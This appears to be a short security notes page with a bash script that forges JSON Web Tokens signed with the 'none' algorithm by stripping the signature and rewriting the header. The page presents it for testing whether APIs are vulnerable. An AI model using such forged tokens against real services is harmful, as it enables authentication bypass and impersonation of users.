---
title: JWT None Algorithm
---

Below is a script that will take in a JSON web token, remove the signature, and change the header so that it is "signed" with the `none` algorithm. This can be used to create JWTs for testing if APIs are vulnerable to none algorithm attacks.


```bash
#!/usr/bin/env bash
set -euo pipefail

echoerr() { echo "$@" 1>&2; }

if [[ $# -ne 1 ]]; then
    echoerr "Expected a single argument: JWT"
    exit 1
fi

token="$1"
original_header="$(cut -d '.' -f 1 <<< "$token")"
original_payload="$(cut -d '.' -f 2 <<< "$token")"
original_header_decoded="$(base64 -d <<< "$original_header")"

new_header_decoded='{"alg":"none","typ":"JWT"}'
new_header="$(base64 <<< "$new_header_decoded" | sed 's/=*$//g')"

# Only send the token to stdout so that it can be captured in a variable
echoerr "Original Header:"
echoerr "   $original_header"
echoerr "   $original_header_decoded"
echoerr "New None Header:"
echoerr "   $new_header"
echoerr "   $new_header_decoded"
echoerr
echo "$new_header.$original_payload."
```
